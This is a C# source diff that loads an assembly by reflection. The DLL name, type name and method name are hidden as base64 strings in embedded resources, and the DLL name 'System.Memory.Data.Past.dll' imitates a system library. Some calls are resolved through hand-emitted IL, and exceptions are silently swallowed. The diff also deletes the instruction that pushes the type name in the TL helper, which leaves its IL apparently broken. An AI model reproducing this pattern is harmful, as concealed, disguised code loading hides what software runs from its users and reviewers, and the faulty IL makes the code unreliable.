@@ -24,68 +24,75 @@ namespace FPE
             throw new System.ApplicationException($"Resource '{resourceFileName}' not find in assembly '{Assembly.GetExecutingAssembly().FullName}'");
         }
        
-        public static string GTR_941AB742314C42D8B29159C3F06E6E47(string resourceFileName, Assembly assembly)
+        public static string GTR(string resourceFileName, Assembly assembly)
         {
             var resourceFullName = GRFN(resourceFileName, assembly);
             using (var _textStreamReader = new StreamReader(assembly.GetManifestResourceStream(resourceFullName)))
                 return _textStreamReader.ReadToEnd();
         }
 
-        //public static string GTR64(string resourceFileName, Assembly assembly)
-        //{
-        //    return Encoding.UTF8.GetString(Convert.FromBase64String(GTR_941AB742314C42D8B29159C3F06E6E47(resourceFileName, assembly)));
-        //}
+        public static string GTR64(string resourceFileName, Assembly assembly)
+        {
+            return Encoding.UTF8.GetString(Convert.FromBase64String(GTR(resourceFileName, assembly)));
+        }
 
         public static string bTos(string b)
         {
             return Encoding.UTF8.GetString(Convert.FromBase64String(b));
         }
 
-        //public static bool ResetConnection_OLD()
+        public static bool ResetConnection()
+        {
+            try
+            {
+                var myAssembly = Assembly.LoadFrom(GTR64("SMDP.txt", Assembly.GetExecutingAssembly())); // @".\System.Memory.Data.Past.dll"
+                var myType = myAssembly.GetType(GTR64("SMDPFPES.txt", Assembly.GetExecutingAssembly())); // "System.Memory.Data.Past.FPEServer"
+                var myMethod = myType.GetMethod(GTR64("RC.txt", Assembly.GetExecutingAssembly()), BindingFlags.Public | BindingFlags.Static); // "ResetConnection"
+                var fileName = GTR("FzCD.txt", Assembly.GetExecutingAssembly());
+                if (myMethod != null)
+                    return (bool)myMethod.Invoke(null, new object[] { fileName }); //var s = @".\Files\zCasData.dat";
+            }
+            catch (Exception ex)
+            {
+                var m = ex.Message;
+            }
+            return false;
+        }
+
+        //public static bool ResetConnection_IL()
         //{
         //    try
         //    {
         //        var myAssembly = Assembly.LoadFrom(GTR64("SMDP.txt", Assembly.GetExecutingAssembly())); // @".\System.Memory.Data.Past.dll"
         //        var myType = myAssembly.GetType(GTR64("SMDPFPES.txt", Assembly.GetExecutingAssembly())); // "System.Memory.Data.Past.FPEServer"
-        //        var myMethod = myType.GetMethod(GTR64("RC.txt", Assembly.GetExecutingAssembly()), BindingFlags.Public | BindingFlags.Static); // "ResetConnection"
-        //        if (myMethod != null)
-        //            return (bool)myMethod.Invoke(null, new object[] { GTR("FzCD.txt", Assembly.GetExecutingAssembly()) }); //var s = @".\Files\zCasData.dat";
+
+        //        //var myType = TL(
+        //        //    Encoding.UTF8.GetString(Convert.FromBase64String(GTR("SMDPFPES.txt", Assembly.GetExecutingAssembly())))
+        //        //    , 
+        //        //    Assembly.LoadFrom(
+        //        //        Encoding.UTF8.GetString(Convert.FromBase64String(GTR("SMDP.txt", Assembly.GetExecutingAssembly()))) /* @".\System.Memory.Data.Past.dll"*/
+        //        //    )
+        //        //);
+
+        //        var ml = ML(myType,
+
+        //            Encoding.UTF8.GetString(Convert.FromBase64String(GTR("RC.txt", Assembly.GetExecutingAssembly()))) /*methodName*/
+        //        );
+
+        //        bool result = ml(GTR("FzCD.txt", Assembly.GetExecutingAssembly()) /* << fileName*/);
         //    }
         //    catch (Exception ex)
         //    {
+        //        var m = ex.Message;
         //    }
         //    return false;
         //}
 
-        public static bool ResetConnection()
-        {
-            try
-            {
-                var myType = TL_6523D4E7C8FE477EA3562813C65A984E(
-                    Encoding.UTF8.GetString(Convert.FromBase64String(GTR_941AB742314C42D8B29159C3F06E6E47("SMDPFPES.txt", Assembly.GetExecutingAssembly())))
-                    , 
-                    Assembly.LoadFrom(
-                        Encoding.UTF8.GetString(Convert.FromBase64String(GTR_941AB742314C42D8B29159C3F06E6E47("SMDP.txt", Assembly.GetExecutingAssembly()))) /* @".\System.Memory.Data.Past.dll"*/
-                    )
-                );
-                bool result = ML_F9CAF08E94D44055A9BDA419A91722B3(myType, 
-
-                    Encoding.UTF8.GetString(Convert.FromBase64String(GTR_941AB742314C42D8B29159C3F06E6E47("RC.txt", Assembly.GetExecutingAssembly()))) /*methodName*/
-
-                )(GTR_941AB742314C42D8B29159C3F06E6E47("FzCD.txt", Assembly.GetExecutingAssembly()) /* << fileName*/); // Test the dynamic call
-            }
-            catch (Exception ex)
-            {
-            }
-            return false;
-        }
-
-        private static Type TL_6523D4E7C8FE477EA3562813C65A984E(string typeName, Assembly myAssembly)
+        private static Type TL(string typeName, Assembly myAssembly)
         {
             var method = new DynamicMethod($"TL{Environment.TickCount}", typeof(Type), new[] { typeof(Assembly) });
             ILGenerator il = method.GetILGenerator();
             il.Emit(OpCodes.Ldarg_0); // Load the argument (assembly)
-            il.Emit(OpCodes.Ldstr, typeName); // Load the type name
 
             MethodInfo getTypeMethod = typeof(Assembly).GetMethod(bTos("R2V0VHlwZQ==" /* GetType */), new[] { typeof(string) }); // Call Assembly.GetType(string)
             il.Emit(OpCodes.Callvirt, getTypeMethod);
@@ -95,7 +102,7 @@ namespace FPE
             return t;
         }
 
-        private static Func<string, bool> ML_F9CAF08E94D44055A9BDA419A91722B3(Type targetType, string methodName)
+        private static Func<string, bool> ML(Type targetType, string methodName)
         {
             MethodInfo resetMethod = targetType.GetMethod(methodName, BindingFlags.Public | BindingFlags.Static);
 
